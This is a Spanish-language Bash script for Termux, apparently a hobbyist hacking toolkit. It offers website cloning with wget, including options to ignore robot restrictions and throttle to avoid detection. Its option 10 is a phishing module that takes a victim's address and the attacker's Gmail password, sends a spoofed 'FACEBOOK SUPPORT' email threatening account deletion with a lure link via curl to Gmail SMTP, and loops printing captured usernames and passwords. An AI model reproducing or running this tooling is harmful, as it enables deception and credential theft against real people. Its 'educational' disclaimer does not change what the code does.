#!/bin/bash

# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet:${Red}CONEXIÓN FALLIDA" | lolcat
    echo 
    echo -e $red "Este script necesita una conexión a Internet Activa" | lolcat
    echo
    echo '
 --------------------------------
| SORRY  BAY  CONEXION FALLIDA  |     
 -------------------------------- 
 '| lolcat -a -d 20
    echo && sleep 5
    exit
  else
negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
      echo -e -n "${verde}
     ┌═══════════════════════┐
     █${yellow}Conectando al Internet${verde} █
     └═══════════════════════┘
                 "${blanco}
    sleep 1
    echo -e -n "${verde}
     ┌═══════════════════════┐
     █${yellow}Conectando al Internet${verde} █
     └═══════════════════════┘
                 "${blanco}
    sleep 1
    echo -e -n "${verde}
     ┌═══════════════════════┐
     █${yellow}Conectando al Internet${verde} █
     └═══════════════════════┘
                 "${blanco}
    sleep 1
    echo -e -n "${verde}
     ┌══════════════════════════════════┐
     █${yellow}Conectando al Internet: ${LighGreenF}CONECTADO${verde} █
     └══════════════════════════════════┘
                 "${blanco}
    sleep 3
# scripting starts
clear
echo -e "Verficiando dependencias ❤ ❤ ❤ ❤ "| lolcat
echo -e "Espere por favor ❤ ❤ ❤ ❤ "| lolcat 
# Verifica si esta instaldo o lo va instalar
which lolcat > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] lolcat..............${green}[ Encontrado ]"
which lolcat > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] lolcat  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea  instalar lolcat "
sudo pip install lolcat
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which lolcat > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which python > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] Python..............${green}[ Encontrado ]"
which python> /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] Python  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar python "
sudo pkg install python
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which python > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which curl > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] curl ...............${green}[ Encontrado ]"
which curl > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] curl  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar curl "
sudo pkg install curl
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which curl > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which wget > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] wget................${green}[ Encontrado ]"
which wget > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] wget  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar wget "
sudo pkg install wget
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which wget > /dev/null 2>&1
sleep 3
fi
echo -e "PROGRAMAS REQUERIDOS SATISFECHO"| lolcat
sleep 5
clear
  fi
}
checkinternet
sleep 2

trap 'printf "\n";stop;exit 1' 2
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
bannerExit
exit
}
reset
bannerExit(){
echo -e "${verde}
   		      
${rojo}   Gracias por Utilizar Mis Herramientas   
					         
${blanco}             luigui2120                         
					        
${blanco} Visita mis proyectos en la siguiente url:   
	                                        
${blanco}  https://github.com/luigui2120                			         

"${blanco}
sleep 5	
exit
}

DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
credenciales(){
clear
negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
#credencial
crede="luigui"
#############
sleep 0.5
clear
echo -e "${verde}
        ╔━━━━━━━━━━━━━━━━━━━━━━╗
        ┃   ${blanco}••   …………………   ●   ${verde}┃
        ┃                      ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ███████      ███████ ┃
        ┃ ███████  ${blanco}>_  ${verde}███████ ┃
        ┃ ███████      ███████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃ ████████████████████ ┃
        ┃                      ┃
        ┃   ${blanco}[=]   [___]   ->   ${verde}┃
        ╚━━━━━━━━━━━━━━━━━━━━━━╝
	┃
        ┃  ┌══════════════════════┐
        └═>█ ${blanco}Informatic in Termux ${verde}█
           └══════════════════════┘
        ${verde}██████████${blanco}█████████████${rojo}██████████
    ${verde}      ┌═════════════════┐
          █${amarillo}FECHA=${blanco}${DIA}${verde} █
          └═════════════════┘
	  ┌═══════════┐
          █${amarillo}HORA=${blanco}${HORA}${verde} █
          └═══════════┘" ${blanco}
echo -e -n "${verde}
┌══════════════════════┐
█${blanco}Introduzca credencial:${verde}█
└══════════════════════┘
┃
└═>>> "${blanco}
read -r "Creden"
if [[ "$Creden" == "${crede}" ]];then
sleep 3
echo -e "${rojo}
┌═════════════════════┐
█ ${amarillo}Credencial correcta ${rojo}█
└═════════════════════┘
"${blanco}
echo -e -n "${verde}
┌═════════════════════════┐
█${blanco}Introduzca la contraseña:${verde}█
└═════════════════════════┘
┃
└═>>> "${blanco}
read -r password
if [ “$password” = “123” ]
then
sleep 5
echo -e "${rojo}
┌════════════════════════════════┐
█${amarillo}Las Credenciales son correctas. ${rojo}█
└════════════════════════════════┘
"${blanco}
Iniciar
else
echo -e "${rojo}
┌═════════════════════════════════════════┐
█${blanco}Contraseña Incorrecta. ingresa de nuevo. ${rojo}█
└═════════════════════════════════════════┘
"${blanco}
sleep 3
credenciales
fi
else
echo -e "${rojo}
┌═══════════════════┐
█ ${blanco}UP UP UP UP UP UP ${rojo}█
└═══════════════════┘
"${blanco}
sleep 2
echo -e "${rojo}
┌═══════════════════┐
█ ${blanco}¡ACCESO DENEGADO! ${rojo}█
└═══════════════════┘
"${blanco}
sleep 5
credenciales
fi
}
color(){
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
#-----------------

}
stop() {

printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
read -p "Option: " guard

if [[ $guard == R || $guard == r ]]; then
sleep 1
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
sleep 0.5
cd Html
./retornal.sh

elif [[ $guard == X || $guard == x ]]; then
sleep 2
exit
else
exit
fi

}
Iniciar(){
sleep 3
clear
	echo -e -n "${verde}
             ┌══════════════════════════┐
             █${blanco}  TERMINOS Y CONDICIONES${verde}  █
             └══════════════════════════┘
                   "${blanco}
	echo ""
        echo "Si utilzias este Script aceptas las siguiente condiciónes:"
	echo ""
	echo "1) No clonar sitios web que pertenescan a bancos"
	echo ""
	echo "2) No clonar sitios institucionales sin permiso u autorización"
	echo ""
	echo "3) Mantegamonos sobre los limites de las politicas segùn tu paìs"
	echo ""
	echo "3) El autor no se hace responsable de mal uso del script"
	echo ""
	echo "Precione "\""Y"\"" Enter para Continuar"
	echo ""

	read x

	case "$x" in
		"")
		bannerExit
		;;

		"Y" | "y")
	clear	
while :
do
echo '	
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
┃ ╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗    ┃
┃ ║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════     ┃
┃ ║██║║██║║██║ ███████║║██║  ║██ ║███████║    ┃ 
┃ ║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════     ┃
┃ ║██║    ║██║ ██║  ██║║██████║  ║███████║    ┃
┃ ╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝V2.3┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
'| lolcat -a -d 20
echo "Este script esta hecho con fines educativo"
echo -e -n "${verde}
     ┌═══════════════┐
     █${blanco}  AUTOR LUIGUI${verde} █
     └═══════════════┘
"${blanco}
color
echo -e -n "${verde}
┌════════════┐                    ┌═════════════════┐
█${blanco} Hora=${HORA}${verde} █                    █${blanco}Fecha=${DIA}${verde} █
└════════════┘                    └═════════════════┘
"${blanco}
echo -e -n "${verde}
      ┌══════════┐
      █${blanco} OPTIONES${verde} █
      └══════════┘
"${blanco}
echo -e -n "${yellow}
$grn [1] $yellow Copiar el interfast de una pagina html                    
$grn [2] $yellow Copiar una pagina completa de html vulnerando robot       
$grn [3] $yellow Copiar html aun con restricciones                          
$grn [4] $yellow Copiar html con limite de velocidad para no ser detectado 
$grn [5] $yellow Verificar el texto o Html                                 
$grn [6] $yellow Ver linia de codigo                                       
$grn [7] $yellow Modificar Html o texto                                    
$grn [8] $yellow Crear texto o Html                                         
$grn [9] $yellow Simulador de pagina web                                    
$grn [10] $yellow Enviar al correo gmail                                   
$grn [11] $yellow Mas Opciones                                                                                                  
"${blanco}  

  echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa opcion:\e[0m""\e[1;31m]\e[0m"
  read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' x
  case $x in
    1)
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa pagina:\e[0m""\e[1;31m]\e[0m"
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var 
      echo -n "Desea poner nombre a al archivo(y/n)? "
      read answer1
      clear 
      if [ "$answer1" != "${answer1#[Yy]}" ];then
      cd Descargas
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var6
      wget $my_var -O $my_var6.html -o /dev/null
      sleep 3
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
      clear
      else
      if [ "$answer1" != "${answer1#[Nn]}" ];then
      cd Descargas
      wget $my_var -O index.html -o /dev/null
      sleep 5
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
	clear
	fi
	fi
      ;;
    2)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var8
         wget  -r -p -U Mozilla $my_var8 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    3)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var9
         wget -r -k $my_var9 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    4)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var10
         wget --wait=20 --limit-rate=20K -r -p -U Mozilla $my_var10 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;

    5)
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mPonga el nombre:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var3
	ls -l $my_var3
	sleep 5
        clear
      ;;
    6)

       echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre :\e[0m""\e[1;31m]\e[0m" 
       read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var4
       grep 'href=' $my_var4
       sleep 10
       clear
      ;;
   7)
     echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
     read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var7
          nano $my_var7
	clear
    ;;
   8)
      echo -n "Desea crear una carpeta(y/n)? "
      read answer16
      clear
      if [ "$answer16" != "${answer16#[Yy]}" ];then 
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
      read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var32
      mkdir -p Html/$my_var32
      cd Html/$my_var32
	nano
      clear
      else
      cd Html
	nano
       fi
    ;;

   9)
   	cd Html
   	 reset	
	./config.sh
    ;;
    10)
#
# Created by: Informatic_in_Termux
#
# EmailSpoofing
#
# VARIABLES
#
PWD=$(pwd)
source $PWD/Colors.sh
#
# FUNCIONES
#
trap 'printf "\n";stop;exit 1' 2
function EmailSpoofing {
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DE SU VÍCTIMA ${rojo}(Gmail) ${verde}█
└═════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Victima
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════┐
█ ${blanco}INGRESE EL NOMBRE DE SU VÍCTIMA ${verde}█
└═════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Nombre_Victima
sleep 0.5
echo -e -n "${verde}
┌══════════════════════════════════════════════┐
█ ${blanco}INGRESE EL ARCHIVO QUE DESEA ENVIAR  ${rojo}(Gmail) ${verde}█
└══════════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r col
sleep 0.5
echo -e -n "${verde}
┌════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DEL ATACANTE ${rojo}(Gmail) ${verde}█
└════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Atacante
sleep 0.5
echo -e -n "${verde}
┌═══════════════════════════════════════════┐
█ ${blanco}INGRESE LA CONTRASEÑA DEL CORREO ATACANTE ${verde}█
└═══════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Clave_Atacante
sleep 0.5
echo -e ""
Plantilla="Falsify"
start1
}
stop() {
VERIFICAR_NGROK=$(ps aux | grep -o "ngrok" | head -n1)
VERIFICAR_PHP=$(ps aux | grep -o "php" | head -n1)
VERIFICAR_SSH=$(ps aux | grep -o "ssh" | head -n1)
if [[ $VERIFICAR_NGROK == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $VERIFICAR_PHP == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $VERIFICAR_SSH == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

CREDENCIALES() {

usuario=$(grep -o 'Account:.*' Templates/$Plantilla/usernames.txt | cut -d " " -f2)


clave=$(grep -o 'Pass:.*' Templates/$Plantilla/usernames.txt | cut -d ":" -f2)

echo -e "${verde}
┌════════════════════┐
█ ${blanco}CORREO ELECTRÓNICO ${verde}█
└════════════════════┘
┃
└═>>>${blanco} $usuario"
echo -e "${verde}
┌════════════┐
█ ${blanco}CONTRASEÑA ${verde}█
└════════════┘
┃
└═>>>${blanco}$clave"
}



start() {
VERIFICAR_CREDENCIALES
}

start1() {
start
}

VERIFICAR_CREDENCIALES() {
echo -e "From: 'FACEBOOK SUPPORT' <${Correo_Atacante}>
To: '${Nombre_Victima}' <${Correo_Victima}>
Subject: CUENTA PROGRAMADA PARA SER ELIMINADA DEFINITIVAMENTE

FACEBOOK

TÚ CUENTA ESTÁ PROGRAMADA PARA ELIMINARSE
DEFINITIVAMENTE.

SI INICIAS SESIÓN EN FACEBOOK EN LOS
PRÓXIMOS 30 DÍAS, TENDRÁS LA OPCIÓN
DE CANCELAR LA ELIMINACIÓN Y RECUPERAR
EL CONTENIDO O LA INFORMACIÓN QUE
AGREGASTE A TU CUENTA.

SI NO HAS SIDO TÚ EL QUE PROGRAMO LA
ELIMINACIÓN DE TU CUENTA, INICIA
SESIÓN DESDE EL SIGUIENTE ENLACE Y
CANCELA EL PROCESO.

© ${Enlace} ©

              Facebook 2020 ©" >> EmailSpoofing.txt

echo -e "${verde}
┌═════════════════════┐
█ ${blanco}ENVIANDO MENSAJE... ${verde}█
└═════════════════════┘
"${blanco}
curl -n --ssl-reqd --mail-from "FACEBOOK" -T /data/data/com.termux/files/home/chribra/$col --mail-rcpt "${Correo_Victima}" --url smtps://smtp.gmail.com:465 -u "${Correo_Atacante}:${Clave_Atacante}" -T EmailSpoofing.txt

echo -e "${verde}
┌══════════════════════════════════════════┐
█ ${blanco}EL MENSAJE FUE ENVIADO CON EXITO${verde}█
└══════════════════════════════════════════┘"
rm EmailSpoofing.txt
while [ true ]; do
if [[ -e "Templates/$Plantilla/usernames.txt" ]]; then
CREDENCIALES
rm -rf Templates/$Plantilla/usernames.txt
fi
sleep 0.5

done
}
EmailSpoofing
    ;;
11)
cd Html
./retorna.sh
    ;;
     HELP|help)
     echo "hola senores"
     clear
    ;;
OPTIONS|options)
     echo "hola senores"
     clear
    ;;
    *)
      echo Comando invalido \"$x\"
     sleep 3
	reset
      ;;
  esac
done		;;

		"N" | "n")
		bannerExit
		;;
      *)
      echo Comando invalido \"$x\"
┌═════════════════════════════┐
█ echo "retorando al inicio"
└═════════════════════════════┘
	Iniciar
      ;;
  esac

}
credenciales
color
